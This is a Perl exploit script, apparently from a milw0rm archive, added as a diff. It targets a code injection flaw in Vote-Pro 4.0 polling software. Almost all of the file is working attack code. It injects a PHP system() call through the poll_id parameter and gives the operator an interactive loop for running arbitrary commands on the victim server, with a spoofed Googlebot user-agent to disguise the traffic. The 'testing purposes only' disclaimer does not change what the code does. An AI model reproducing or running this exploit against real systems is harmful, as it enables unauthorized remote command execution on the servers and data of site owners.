@@ -1,0 +1,68 @@
+#################################################################################################
+#                                    r0ut3r Presents...                                         #
+#                                                                                               #
+#                                Another r0ut3r discovery!                                      #
+#                                  writ3r [at] gmail.com                                        #
+#                                                                                               #
+#                          Vote-Pro Code Injection 0day Exploit                                 #
+#################################################################################################
+# Software: Vote-Pro 4.0                                                                        #
+#                                                                                               #
+# Vendor: http://www.vote-pro.com/                                                              #
+#                                                                                               #
+# Released: 2007/01/23                                                                          #
+#                                                                                               #
+# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
+#                                                                                               #
+# Note: The information provided in this document is for Vote-Pro administrator                 #
+# testing purposes only!                                                                        #
+#################################################################################################
+
+use IO::Socket;
+
+$port = "80"; # connection port
+$target = shift; # vote-pro.com
+$folder = shift; # /votepro/
+
+sub Header()
+{
+	print q
+	{Vote-Pro Code Injection Exploit - writ3r [at] gmail.com
+-------------------------------------------------------
+};
+}
+
+sub Usage()
+{
+	print q
+	{
+Usage: votecmd.pl [target] [directory]
+Example: votecmd.pl vote-pro.com /votepro/
+};
+	exit();
+}
+
+Header();
+
+if (!$target || !$folder) {
+	Usage(); }
+
+print "[+] Connecting...\n";
+$cmd = "dir";
+while ($cmd !~ "exit")
+{
+	$xpack = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect on exploit attempt. Exiting...\r\n";
+	print $xpack "GET ".$folder."poll_frame.php?poll_id=hyphy;system($_GET[com]);&com=".substr($cmd, 0, -1)."; HTTP/1.1\n";
+	print $xpack "Host: $target\n";
+	print $xpack "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
+	print $xpack "Accept: text/html\n";
+	print $xpack "Connection: keep-alive\n\n";
+
+	print "[cmd]\$ ";
+	$cmd = <STDIN>;
+	$cmd =~ s/ /%20/g;
+}
+
+print "[!] Connection to host lost...\n";
+
+# milw0rm.com [2007-01-23]
